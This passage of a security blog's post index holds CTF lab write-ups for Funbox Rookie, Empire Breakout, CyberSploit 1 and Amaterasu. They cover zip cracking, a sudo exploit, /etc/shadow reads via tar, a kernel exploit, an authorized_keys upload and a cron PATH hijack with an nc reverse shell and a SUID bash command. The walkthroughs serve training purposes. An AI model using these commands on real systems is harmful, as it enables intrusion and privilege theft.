ftp ftp 1477 Jul 25 2020 zlatan.zip226 Transfer completeftp>```{: .nolineno}Now I downloaded all the files into the attackers machine â†’```bashwget -r ftp://192.168.225.107```{: .nolineno}Now lets dig into the files â†’with the help of fcrackzip tool I cracked the zip passwords â†’![Untitled](/Vulnhub-Files/img/Funbox-Rookie/Untitled%202.png)```bashPASSWORD FOUND!!!!: pw == iubire```{: .nolineno}```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Funbox-Rookie/192.168.225.107]â””â”€$ unzip tom.zip Archive: tom.zip[tom.zip] id_rsa password: inflating: id_rsa```{: .nolineno}## SHELL â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Funbox-Rookie/192.168.225.107]â””â”€$ ssh tom@192.168.225.107 -i id_rsa The authenticity of host '192.168.225.107 (192.168.225.107)' cant be established.ED25519 key fingerprint is SHA256:ZBER3N78DusT56jsi/IGcAxcCB2W5CZWUJTbc3K4bZc.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '192.168.225.107' (ED25519) to the list of known hosts.Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-117-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat Jul 8 10:45:19 UTC 2023 System load: 0.0 Processes: 164 Usage of /: 75.8% of 4.37GB Users logged in: 0 Memory usage: 38% IP address for ens256: 192.168.225.107 Swap usage: 0%30 packages can be updated.0 updates are security updates.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.To run a command as administrator (user \"root\"), use \"sudo \".See \"man sudo_root\" for details.tom@funbox2:~$tom@funbox2:~$ cat local.txt866bc12b3cc3f88f2bcfb8d091713b46tom@funbox2:~$```{: .nolineno}Now lets see the Sudo version â†’```bashtom@funbox2:~$ sudo -VSudo version 1.8.21p2Sudoers policy plugin version 1.8.21p2Sudoers file grammar version 46Sudoers I/O plugin version 1.8.21p2tom@funbox2:~$```{: .nolineno}Lets search an exploit for this Sudo version â†’I got this exploit of [**CVE-2021-3156 (Sudo Baron Samedit)**](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py) and I used `exploit_nss.py` exploit **â†’**```bashtom@funbox2:/tmp$ nano exp.pytom@funbox2:/tmp$ chmod +x exp.pytom@funbox2:/tmp$ python3 exp.py# whoamiroot# /bin/bash -iTo run a command as administrator (user \"root\"), use \"sudo \".See \"man sudo_root\" for details.root@funbox2:/tmp# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(tom)root@funbox2:/tmp# whoamirootroot@funbox2:/tmp# cd /rootroot@funbox2:/root# ls -altotal 32drwx------ 4 root root 4096 Jul 9 09:51 .drwxr-xr-x 24 root root 4096 Oct 14 2020 ..-rw------- 1 root root 0 Oct 14 2020 .bash_history-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwx------ 3 root root 4096 Sep 15 2020 .gnupg-rw-r--r-- 1 root root 148 Aug 17 2015 .profiledrwx------ 2 root root 4096 Jul 25 2020 .ssh-rw-r--r-- 1 root root 32 Oct 14 2020 flag.txt-rw------- 1 root root 33 Jul 9 09:51 proof.txtroot@funbox2:/root# cat flag.txt Your flag is in another file...root@funbox2:/root# cat proof.txt7ca58542dc8a0d0181aaf812ae214c69root@funbox2:/root#```{: .nolineno}Now I am root !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Empire Breakout", "url": "/posts/Empire-breakout/", "categories": "Proving Grounds, Play", "tags": "PrivEsc, SUIDs", "date": "2023-07-16 00:00:00 +0530", "snippet": "## **Description â¤µï¸**> ðŸ’¡ This machine consists of username enumeration through bruteforce then access the webshell after that play with SUIDs comamds for root !{: .prompt-tip }### Letâ€™s find the IP...", "content": "## **Description â¤µï¸**> ðŸ’¡ This machine consists of username enumeration through bruteforce then access the webshell after that play with SUIDs comamds for root !{: .prompt-tip }### Letâ€™s find the IP Address first >>```bashIP : 192.168.164.238```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Empire-breakout]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.164.238Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-15 14:22 ISTStats: 0:09:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 39.94% done; ETC: 14:46 (0:14:02 remaining)Warning: 192.168.164.238 giving up on port because retransmission cap hit (6).Nmap scan report for 192.168.164.238Host is up (0.30s latency).Not shown: 65510 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.51 ((Debian))|_http-title: Apache2 Debian Default Page: It works|_http-server-header: Apache/2.4.51 (Debian)2904/tcp filtered m2ua4078/tcp filtered cssp9250/tcp filtered unknown10000/tcp open tcpwrapped12407/tcp filtered unknown12665/tcp filtered unknown14359/tcp filtered unknown14997/tcp filtered unknown16032/tcp filtered unknown17092/tcp filtered unknown19944/tcp filtered unknown20000/tcp open http MiniServ 1.830 (Webmin httpd)|_http-server-header: MiniServ/1.830|_http-title: 200 &mdash; Document follows22474/tcp filtered unknown26283/tcp filtered unknown29720/tcp filtered unknown31306/tcp filtered unknown39871/tcp filtered unknown41579/tcp filtered unknown55786/tcp filtered unknown57478/tcp filtered unknown57725/tcp filtered unknown62844/tcp filtered unknown63324/tcp filtered unknown63436/tcp filtered unknownService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 1374.00 seconds```{: .nolineno}---## Web Enumeration â¤µï¸Now this machine runs an Apache server After checking the source code I got this â†’![Untitled](/Vulnhub-Files/img/Empire-breakout/Untitled.png)After decoding this Brainfuck encoding I got this â†’![Untitled](/Vulnhub-Files/img/Empire-breakout/Untitled%201.png)```bash.2uqPEfj3D/dev/null/home/cyber/tar cap_dac_read_search=ep/usr/bin/ping cap_net_raw=epcyber@breakout:/$```{: .nolineno}If I canâ€™t be root directly through executing the payload of tar into the shell so lets try to read the content of root priviledge files through this payload â†’```bashFile read >LFILE=file_to_readtar xf \"$LFILE\" -I '/bin/sh -c \"cat 1>&2\"'```{: .nolineno}```bashcyber@breakout:~$ ./tar xf /etc/shadow -I '/bin/sh -c \"cat 1>&2\"' root:$y$j9T$eJzu0TYuqGwZThJJzbP6o.$Xs23PV9/MdV33YMgceRv1Ic6anL08XclYLE9UX1WiJ6:19381:0:99999:7:::daemon:*:18919:0:99999:7:::bin:*:18919:0:99999:7:::sys:*:18919:0:99999:7:::sync:*:18919:0:99999:7:::games:*:18919:0:99999:7:::man:*:18919:0:99999:7:::lp:*:18919:0:99999:7:::mail:*:18919:0:99999:7:::news:*:18919:0:99999:7:::uucp:*:18919:0:99999:7:::proxy:*:18919:0:99999:7:::www-data:*:18919:0:99999:7:::backup:*:18919:0:99999:7:::list:*:18919:0:99999:7:::irc:*:18919:0:99999:7:::gnats:*:18919:0:99999:7:::nobody:*:18919:0:99999:7:::_apt:*:18919:0:99999:7:::systemd-timesync:*:18919:0:99999:7:::systemd-network:*:18919:0:99999:7:::systemd-resolve:*:18919:0:99999:7:::messagebus:*:18919:0:99999:7:::cyber:$y$j9T$x6sDj5S/H0RH4IGhi0c6x0$mIPyCIactTA3/gxTaI7zctfCt2.EOGXTOW4X9efAVW4:18919:0:99999:7:::systemd-coredump:!*:18919::::::cyber@breakout:~$```{: .nolineno}Now while enumeration I also found a file named as .old.pass.bak but it has root permission so lets try to open that file â†’```bashcyber@breakout:/var/backups$ ls -al total 484drwxr-xr-x 2 root root 4096 Dec 8 2022 .drwxr-xr-x 14 root root 4096 Oct 19 2021 ..-rw-r--r-- 1 root root 40960 Dec 8 2022 alternatives.tar.0-rw-r--r-- 1 root root 12674 Nov 17 2022 apt.extended_states.0-rw-r--r-- 1 root root 1467 Oct 19 2021 apt.extended_states.1.gz-rw-r--r-- 1 root root 0 Dec 8 2022 dpkg.arch.0-rw-r--r-- 1 root root 186 Oct 19 2021 dpkg.diversions.0-rw-r--r-- 1 root root 135 Oct 19 2021 dpkg.statoverride.0-rw-r--r-- 1 root root 413488 Oct 19 2021 dpkg.status.0-rw------- 1 root root 17 Oct 20 2021 .old_pass.bakcyber@breakout:/var/backups$```{: .nolineno}```bashcyber@breakout:~$ ./tar xf /var/backups/.old_pass.bak -I '/bin/sh -c \"cat 1>&2\"'Ts&4&YurgtRX(=~hcyber@breakout:~$```{: .nolineno}Now lets use this string value as a password of this root user â†’```bashcyber@breakout:~$ su rootPassword: root@breakout:/home/cyber# cd /rootroot@breakout:~# whoamirootroot@breakout:~# iduid=0(root) gid=0(root) groups=0(root)root@breakout:~# ls -altotal 40drwx------ 6 root root 4096 Jul 15 04:50 .drwxr-xr-x 18 root root 4096 Oct 19 2021 ..-rw------- 1 root root 1010 Dec 14 2022 .bash_history-rw-r--r-- 1 root root 571 Apr 10 2021 .bashrcdrwxr-xr-x 3 root root 4096 Oct 19 2021 .local-rw-r--r-- 1 root root 161 Jul 9 2019 .profile-rw-r--r-- 1 root root 33 Jul 15 04:50 proof.txtdrwx------ 2 root root 4096 Oct 19 2021 .spamassassindrwxr-xr-x 2 root root 4096 Oct 19 2021 .tmpdrwx------ 6 root root 4096 Oct 19 2021 .userminroot@breakout:~# cat proof.txtd433cb8a51a9d8e36e928a564f71d053root@breakout:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "CyberSploit 1", "url": "/posts/CyberSploit-1/", "categories": "Proving Grounds, Play", "tags": "Kernel Exploit, PrivEsc", "date": "2023-07-16 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>ðŸ’¡ [CyberSploit-1](https://vulnhub.com/entry/cybersploit-1,506/)THIS IS A MACHINE FOR COMPLETE BEGINNER , THERE ARE THREE FALGS AVAILABLE IN THIS VM.FROM THIS VMs YOU WILL LEAR...", "content": "## **Description â¤µï¸**>ðŸ’¡ [CyberSploit-1](https://vulnhub.com/entry/cybersploit-1,506/)THIS IS A MACHINE FOR COMPLETE BEGINNER , THERE ARE THREE FALGS AVAILABLE IN THIS VM.FROM THIS VMs YOU WILL LEARN ABOUT ENCODER-DECODER & EXPLOIT-DB.{: .prompt-info }### Letâ€™s find the IP Address first >>```bashIP : 192.168.195.92```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/CyberSploit]â””â”€$ sudo nmap -sC -sV -T4 -oN Nmap_results.txt 192.168.195.92 Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-28 20:36 ISTNmap scan report for 192.168.195.92Host is up (0.18s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)| 2048 d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)|_ 256 ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)80/tcp open http Apache httpd 2.2.22 ((Ubuntu))|_http-title: Hello Pentester!|_http-server-header: Apache/2.2.22 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}---## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/CyberSploit-1/Untitled.png)After checking the source code I got this â†’![Untitled](/Vulnhub-Files/img/CyberSploit-1/Untitled%201.png)```bashusername:itsskv```{: .nolineno}Now lets check robots.txt file â†’![Untitled](/Vulnhub-Files/img/CyberSploit-1/Untitled%202.png)Now after decoding this base64 encoding I got this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/CyberSploit]â””â”€$ echo \"Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=\" | base64 -dcybersploit{youtube.com/c/cybersploit}```{: .nolineno}Now lets use this â¬†ï¸ above string to use as a password for ssh login So, lets give it a try at least â†’## SHELL âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/CyberSploit]â””â”€$ ssh itsskv@192.168.195.92 The authenticity of host '192.168.195.92 (192.168.195.92)' cant be established.ECDSA key fingerprint is SHA256:19IzxsJJ/ZH00ix+vmS6+HQqDcXtk9k30aT3K643kSs.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '192.168.195.92' (ECDSA) to the list of known hosts.itsskv@192.168.195.92 is password: Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686) * Documentation: https://help.ubuntu.com/New release '14.04.6 LTS' available.Run 'do-release-upgrade' to upgrade to it.Your Hardware Enablement Stack (HWE) is supported until April 2017.itsskv@cybersploit-CTF:~$```{: .nolineno}Now when I am inside the shell lets try different things to get to root â†’```bashitsskv@cybersploit-CTF:~$ cat local.txt d19dff81aa1a2e22550afd3b583ea580itsskv@cybersploit-CTF:~$itsskv@cybersploit-CTF:~$ cat flag2.txt Your flag is in another file...itsskv@cybersploit-CTF:~$```{: .nolineno}Lets check the SUIDs and GUIDs files â†’```bashitsskv@cybersploit-CTF:/$ find / -perm -u=s -type f 2>/dev/null/bin/fusermount/bin/ping/bin/su/bin/umount/bin/mount/bin/ping6/usr/bin/newgrp/usr/bin/sudoedit/usr/bin/X/usr/bin/passwd/usr/bin/chfn/usr/bin/gpasswd/usr/bin/arping/usr/bin/chsh/usr/bin/sudo/usr/bin/mtr/usr/bin/lppasswd/usr/bin/traceroute6.iputils/usr/bin/pkexec/usr/bin/at/usr/sbin/uuidd/usr/sbin/pppd/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/pt_chownitsskv@cybersploit-CTF:/$ find / -perm -g=s -type f 2>/dev/null/sbin/unix_chkpwd/usr/bin/mlocate/usr/bin/X/usr/bin/crontab/usr/bin/chage/usr/bin/dotlockfile/usr/bin/bsd-write/usr/bin/ssh-agent/usr/bin/mail-unlock/usr/bin/mail-lock/usr/bin/mail-touchlock/usr/bin/expiry/usr/bin/at/usr/bin/wall/usr/sbin/uuidd/usr/games/gnomine/usr/games/mahjongg/usr/lib/libvte-2.90-9/gnome-pty-helper/usr/lib/utempter/utempter/usr/lib/evolution/camel-lock-helper-1.2itsskv@cybersploit-CTF:/$```{: .nolineno}Now after checking so many things lets look for Kernel Exploitation â†’```bashitsskv@cybersploit-CTF:/home/cybersploit$ uname -aLinux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linuxitsskv@cybersploit-CTF:/home/cybersploit$```{: .nolineno}After reconing online I got an exploit â†’ [https://www.exploit-db.com/raw/37292](https://www.exploit-db.com/raw/37292)Lets try it out now â†’```bashitsskv@cybersploit-CTF:/tmp$ nano explit.citsskv@cybersploit-CTF:/tmp$ chmod +x explit.citsskv@cybersploit-CTF:/tmp$ gcc explit.c -o shellitsskv@cybersploit-CTF:/tmp$ ./shellspawning threadsmount #1mount #2child threads done/etc/ld.so.preload createdcreating shared library# /bin/bash -iroot@cybersploit-CTF:/tmp# whoamirootroot@cybersploit-CTF:/tmp# iduid=0(root) gid=0(root) groups=0(root),1001(itsskv)root@cybersploit-CTF:/tmp# cd /rootroot@cybersploit-CTF:/root# ls -altotal 136drwx------ 20 root root 4096 Jun 28 20:24 .drwxr-xr-x 23 root root 4096 Sep 22 2020 ..-rw------- 1 root root 3540 Sep 23 2020 .ICEauthority-rw------- 1 root root 0 Sep 23 2020 .Xauthority-rw------- 1 root root 0 Sep 23 2020 .bash_history-rw-r--r-- 1 root root 3106 Apr 19 2012 .bashrcdrwx------ 13 root root 4096 Sep 3 2020 .cachedrwx------ 9 root root 4096 Sep 3 2020 .configdrwx------ 3 root root 4096 Jun 27 2020 .dbus-rw-r--r-- 1 root root 25 Sep 23 2020 .dmrcdrwx------ 3 root root 4096 Sep 23 2020 .gconfdrwx------ 4 root root 4096 Sep 3 2020 .gnome2-rw-r--r-- 1 root root 107 Sep 23 2020 .gtk-bookmarksdrwx------ 2 root root 4096 Sep 3 2020 .gvfsdrwxr-xr-x 3 root root 4096 Sep 4 2020 .localdrwx------ 3 root root 4096 Sep 3 2020 .mission-controldrwx------ 4 root root 4096 Sep 3 2020 .mozilla-rw-r--r-- 1 root root 140 Apr 19 2012 .profiledrwx------ 2 root root 4096 Sep 23 2020 .pulse-rw------- 1 root root 256 Jun 25 2020 .pulse-cookie-rw------- 1 root root 11459 Sep 23 2020 .xsession-errors-rw------- 1 root root 11011 Sep 22 2020 .xsession-errors.olddrwxr-xr-x 2 root root 4096 Sep 3 2020 Desktopdrwxr-xr-x 2 root root 4096 Sep 3 2020 Documentsdrwxr-xr-x 2 root root 4096 Sep 3 2020 Downloadsdrwxr-xr-x 2 root root 4096 Sep 3 2020 Musicdrwxr-xr-x 2 root root 4096 Sep 3 2020 Picturesdrwxr-xr-x 2 root root 4096 Sep 3 2020 Publicdrwxr-xr-x 2 root root 4096 Sep 3 2020 Templatesdrwxr-xr-x 2 root root 4096 Sep 3 2020 Videos-rw-r--r-- 1 root root 32 Sep 4 2020 finalflag.txt-rw-r--r-- 1 root root 33 Jun 28 20:24 proof.txtroot@cybersploit-CTF:/root# cat finalflag.txt Your flag is in another file...root@cybersploit-CTF:/root# cat proof.txt 59595564ca25b9405d338daab9170f4croot@cybersploit-CTF:/root# ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever3: eth0: mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 00:50:56:ba:1f:90 brd ff:ff:ff:ff:ff:ff inet 192.168.195.92/24 brd 192.168.195.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::250:56ff:feba:1f90/64 scope link valid_lft forever preferred_lft foreverroot@cybersploit-CTF:/root#```{: .nolineno}---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Amaterasu", "url": "/posts/Amaterasu/", "categories": "Proving Grounds, Play", "tags": "authorized_keys, crontab, PrivEsc", "date": "2023-07-16 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>ðŸ’¡ This machine is new and very interesting in terms of file upload and getting shell after altering with .ssh directory .{: .prompt-tip }### Letâ€™s find the IP Address first >>...", "content": "## **Description â¤µï¸**>ðŸ’¡ This machine is new and very interesting in terms of file upload and getting shell after altering with .ssh directory .{: .prompt-tip }### Letâ€™s find the IP Address first >>```bashIP : 192.168.171.249```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Amaterasu]â””â”€$ sudo nmap -sC -sV -p- -T4 192.168.171.249 Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-03 21:18 ISTStats: 0:05:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 96.47% done; ETC: 21:24 (0:00:12 remaining)Nmap scan report for 192.168.171.249Host is up (0.18s latency).Not shown: 65524 filtered tcp ports (no-response)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Cant get directory listing: TIMEOUT| ftp-syst: | STAT: | FTP server status:| Connected to 192.168.45.228| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp closed ssh111/tcp closed rpcbind139/tcp closed netbios-ssn443/tcp closed https445/tcp closed microsoft-ds2049/tcp closed nfs10000/tcp closed snet-sensor-mgmt25022/tcp open ssh OpenSSH 8.6 (protocol 2.0)| ssh-hostkey: | 256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)|_ 256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)33414/tcp open unknown| fingerprint-strings: | GetRequest, HTTPOptions: | HTTP/1.1 404 NOT FOUND| Server: Werkzeug/2.2.3 Python/3.9.13| Date: Mon, 03 Jul 2023 15:54:12 GMT| Content-Type: text/html; charset=utf-8| Content-Length: 207| Connection: close| | | 404 Not Found| Not Found| The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.| Help: | | | | | Error response| | | Error response| Error code: 400| Message: Bad request syntax ('HELP').| Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.| | | RTSPRequest: | | | | | Error response| | | Error response| Error code: 400| Message: Bad request version ('RTSP/1.0').| Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.| |_ 40080/tcp open http Apache httpd 2.4.53 ((Fedora))| http-methods: |_ Potentially risky methods: TRACE|_http-title: My test page|_http-server-header: Apache/2.4.53 (Fedora)```{: .nolineno}---## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled.png)![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%201.png)Now I have to use feroxbuster for directory or files bruteforcing â†’![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%202.png)![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%203.png)![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%204.png)Now lets see the `/file-list?dir=/tmp` directory section â†’![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%205.png)So it seams that I can see the /tmp directory of inside this machine so lets see something more â†’![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%206.png)we have a user named as `alfredo` and it also contains .ssh file which contains id_rsa key so lets see how can I access it or how can I break into the shell â†’I tried to access the `/file-upload/` directory with curl request so I got this â†’![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%207.png)Now lets use the curl for POST request to the web â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Amaterasu]â””â”€$ curl -L -i -X POST http://192.168.211.249:33414/file-upload HTTP/1.1 400 BAD REQUESTServer: Werkzeug/2.2.3 Python/3.9.13Date: Wed, 05 Jul 2023 09:12:10 GMTContent-Type: application/jsonContent-Length: 42Connection: close{\"message\":\"No file part in the request\"}```{: .nolineno}Now I have to include the headers for File upload so lets take an `example.txt` as a file name for uploading into the web â†’![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%208.png)Now I saw that the example.txt file got uploaded into the `/tmp` folder â†’![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%209.png)lets upload the file into the `/home/alfredo/` directory â†’But firstly I got to know that only these extensions of files are allowed to upload into the system â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Amaterasu]â””â”€$ curl -L -i -X POST -H \"Content-Type: multipart/form-data\" -F file=\"@/home/kali/Downloads/Proving_Ground/Amaterasu/hello\" -F filename=\"hello\" http://192.168.211.249:33414/file-uploadHTTP/1.1 400 BAD REQUESTServer: Werkzeug/2.2.3 Python/3.9.13Date: Wed, 05 Jul 2023 09:18:51 GMTContent-Type: application/jsonContent-Length: 67Connection: close{\"message\":\"Allowed file types are txt, pdf, png, jpg, jpeg, gif\"}```{: .nolineno}So now lets try that file to upload into the users directory â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Amaterasu]â””â”€$ curl -L -i -X POST -H \"Content-Type: multipart/form-data\" -F file=\"@/home/kali/Downloads/Proving_Ground/Amaterasu/example.txt\" -F filename=\"/home/alfredo/example.txt\" http://192.168.211.249:33414/file-uploadHTTP/1.1 201 CREATEDServer: Werkzeug/2.2.3 Python/3.9.13Date: Wed, 05 Jul 2023 09:21:31 GMTContent-Type: application/jsonContent-Length: 41Connection: close{\"message\":\"File successfully uploaded\"}```{: .nolineno}![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%2010.png)If I can upload a file into the alfredo directory so lets include our `authorized_key` from attckers machine â†’Now In attackers machine with ssh-keygen I created the keys so lets transfer it to `/home/alfredo/.ssh/authorized_keys` â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Amaterasu]â””â”€$ ssh-keygen Generating public/private rsa key pair.Enter file in which to save the key (/home/kali/.ssh/id_rsa): id_rsaEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in id_rsaYour public key has been saved in id_rsa.pubThe key fingerprint is:SHA256:0EVUwRGUiPRxpxY+B5+ryFEq9wfwiq+BUsaz0yRNDcw kali@kaliThe keys randomart image is:+---[RSA 3072]----+| +o+==X=. || .E=.+o* . || . o + * + || . + * o . || * S + o . || o B = = o || . + + + o . || . . o . || ... |+----[SHA256]-----+```{: .nolineno}Now I first tried it I failed because it does not contains any extensions so I converted into .txt extension then I tried it â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Amaterasu]â””â”€$ cp id_rsa.pub id_rsa.pub.txtâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Amaterasu]â””â”€$ curl -L -i -X POST -H \"Content-Type: multipart/form-data\" -F file=\"@id_rsa.pub.txt\" -F filename=\"/home/alfredo/.ssh/authorized_keys\" http://192.168.230.249:33414/file-upload HTTP/1.1 201 CREATEDServer: Werkzeug/2.2.3 Python/3.9.13Date: Thu, 06 Jul 2023 07:23:59 GMTContent-Type: application/jsonContent-Length: 41Connection: close{\"message\":\"File successfully uploaded\"}```{: .nolineno}---## SHELL âž¡ï¸Now lets try ssh into the alfredo user â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Amaterasu]â””â”€$ sudo ssh alfredo@192.168.230.249 -p 25022 -i id_rsa[sudo] password for kali: The authenticity of host '[192.168.230.249]:25022 ([192.168.230.249]:25022)' cant be established.ED25519 key fingerprint is SHA256:kflJUZqQzlDWxXgGuod+HGsJPk++nvt5ZyveJgx1jgQ.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '[192.168.230.249]:25022' (ED25519) to the list of known hosts.Last login: Tue Mar 28 03:21:25 2023[alfredo@fedora ~]$ whoamialfredo[alfredo@fedora ~]$ iduid=1000(alfredo) gid=1000(alfredo) groups=1000(alfredo)[alfredo@fedora ~]$ pwd/home/alfredo[alfredo@fedora ~]$```{: .nolineno}Now here is local.txt file â†’```bash[alfredo@fedora ~]$ cat local.txtb25a3490ade72606c99eb6e1fe38db7a[alfredo@fedora ~]$```{: .nolineno}Now while enumeration further I checked cronjob file I got this â†’```bash[alfredo@fedora ~]$ crontab -lno crontab for alfredo[alfredo@fedora ~]$ cat /etc/crontabSHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=root# For details see man 4 crontabs# Example of job definition:# .---------------- minute (0 - 59)# | .------------- hour (0 - 23)# | | .---------- day of month (1 - 31)# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# | | | | |# * * * * * user-name command to be executed*/1 * * * * root /usr/local/bin/backup-flask.sh[alfredo@fedora ~]$```{: .nolineno}Now lets see the `/usr/local/bin/backup-flask.sh` file â†’```bash[alfredo@fedora restapi]$ cat /usr/local/bin/backup-flask.sh#!/bin/shexport PATH=\"/home/alfredo/restapi:$PATH\"cd /home/alfredo/restapitar czf /tmp/flask.tar.gz *[alfredo@fedora restapi]$```{: .nolineno}So I see that the path changes to /home/alfredo/restapi so lets move accordingly , and create a file named as tar with executable permissions and that file show contains this â†’```bash[alfredo@fedora restapi]$ cat tar#!/bin/bashrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.234 4444 >/tmp/fchmod u+s /bin/bash[alfredo@fedora restapi]$```{: .nolineno}I tried for reverse shell but not got that So what I did was that the script add a SUID bit to a binary , that I will have access to. The script runs every minute (according to the crontab). So a minute later I check the find binary andâ€¦```bash[alfredo@fedora restapi]$ ls -al /bin/bash-rwxr-xr-x. 1 root root 1390080 Jan 25 2021 /bin/bash[alfredo@fedora restapi]$ [alfredo@fedora restapi]$ ls -al /bin/bash-rwsr-xr-x. 1 root root 1390080 Jan 25 2021 /bin/bash```{: .nolineno}Now lets root this machine with bash command â†’```bash[alfredo@fedora restapi]$ /bin/bash -pbash-5.1# whoamirootbash-5.1# iduid=1000(alfredo) gid=1000(alfredo) euid=0(root) groups=1000(alfredo)bash-5.1# cd /rootbash-5.1# ls -altotal 56dr-xr-x---. 3 root root 210 Jul 6 03:22 .dr-xr-xr-x. 17 root root 244 Mar 28 03:19 ..-rw-------. 1 root root 665 Jan 24 05:22 anaconda-ks.cfg-rw-------. 1 root root 260 Mar 28 03:23 .bash_history-rw-r--r--. 1 root root 18 Jan 28 2021 .bash_logout-rw-r--r--. 1 root root 141 Jan 28 2021 .bash_profile-rw-r--r--. 1 root root 429 Jan 28 2021 .bashrc-rw-r--r--. 1 root root 9526 Jan 12 07:50 